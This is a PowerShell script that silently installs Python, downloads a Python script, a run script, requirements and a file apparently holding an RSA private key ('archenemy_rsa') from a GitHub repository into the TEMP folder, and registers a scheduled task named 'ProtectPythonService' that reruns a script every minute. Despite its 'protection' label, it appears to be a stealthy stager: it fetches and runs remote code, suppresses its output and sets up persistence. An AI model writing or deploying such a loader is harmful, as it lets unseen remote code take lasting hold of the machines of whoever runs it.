# Search the python executable
$pythonPath = Get-Command python -ErrorAction SilentlyContinue

# If python executable is not found, install python
if (-not $pythonPath) {
    # Define the URL for the Python installer
    $installerUrl = "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe"
    
    # Define the path for the downloaded installer
    $installerPath = "$env:TEMP\python_installer.exe"

    # Download the Python installer
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath

    # Install Python silently
    Start-Process -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -NoNewWindow -Wait

    # Verify installation
    $pythonPath = Get-Command python -ErrorAction SilentlyContinue
    if ($pythonPath) {
    } else {
    }

    # Clean up
    Remove-Item -Path $installerPath -Force
} else {
}

# Fetch the python executable path
$pythonPath = [System.IO.Path]::GetDirectoryName($pythonPath.Source)
$pythonPath = "$pythonPath\python.exe"

######################################################## Here finish the python installation


# Download the python script directly with invoke-webrequest
$outDirectory = "$env:TEMP"		# Temp directory in Windows

$repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
$runUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/run_protection.ps1"
$requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
$contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/archenemy_rsa"

$scriptPath = "${outDirectory}/protection.py"
$runPath = "${outDirectory}/run_protection.ps1"
$requirementsPath = "${outDirectory}/requirements.txt"
$contentPath = "${outDirectory}/archenemy_rsa"

# Check if scriptPath already exists
if (Test-Path $scriptPath) {
    # If it exists, delete it
    Remove-Item $scriptPath -Force
}


# Try to make the web requests
try {
	# Download the repository and requirements
	Invoke-WebRequest -Uri $repoUrl -OutFile $scriptPath
	Invoke-WebRequest -Uri $runUrl -OutFile $runPath
	Invoke-WebRequest -Uri $requirementsUrl -OutFile $requirementsPath
	Invoke-WebRequest -Uri $contentUrl -OutFile $contentPath

    # Install the Python packages from requirements.txt
    & python -m pip install --upgrade pip *> $null
    & python -m pip install -r $requirementsPath *> $null


} catch {
    # Check if the file already exists
    if (Test-Path -Path $scriptPath) {
    } else {
    }
}

# Schedule Task for every startup
$TaskName = "ProtectPythonService"

# Check if the scheduled task exists
$scheduledTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

if ($scheduledTask) {
    
    # Delete the existing task
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    
} else {
}


# Define the action
#$python_path = (Get-Command python).Definition
#$action = New-ScheduledTaskAction -Execute "$python_path" -Argument "`"$scriptPath`""
#$action = New-ScheduledTaskAction -Execute "$python_path" -Argument "`"C:\Users\Beatriz Adriana G\Other\protection\light\protection.py`""
#$action = New-ScheduledTaskAction -Execute "$python_path" -Argument 'C:\Users\Public\Other\Schedule\schedule.py'

#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'C:\Users\Public\Other\protection\run_protection.ps1'
#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "`"$runPath`""

#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'C:\Users\Public\Other\Schedule\run_schedule.ps1'
#$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "C:\Users\Beatriz Adriana G\Other\protection\light\run_protection.ps1"

$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "`"C:\Users\Beatriz Adriana G\Other\protection\light\run_protection.ps1`""

# Define triggers
$t1 = New-ScheduledTaskTrigger -Daily -At 03:08pm
$t2 = New-ScheduledTaskTrigger -Once -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Hours 1) -At 03:08pm
$t1.Repetition = $t2.Repetition

# Register the task
Register-ScheduledTask -Action $action -Trigger $t1 -TaskName "$TaskName" -Force


# Call the downloaded script if exist
#if (Test-Path -Path $scriptPath) {
#	$scriptPathNoExtension = [System.IO.Path]::GetFileNameWithoutExtension($scriptPath)
#	$env:PYTHONWARNINGS="ignore"

    # Start the Python script in the background
#	Start-Process -NoNewWindow -FilePath "$pythonPath" -ArgumentList "`"$scriptPath`""

	# Execute the script
	#& "$pythonPath" "$scriptPath" > $null 2>&1
	#echo "[*] Python Script executed!"
#} else {
#}
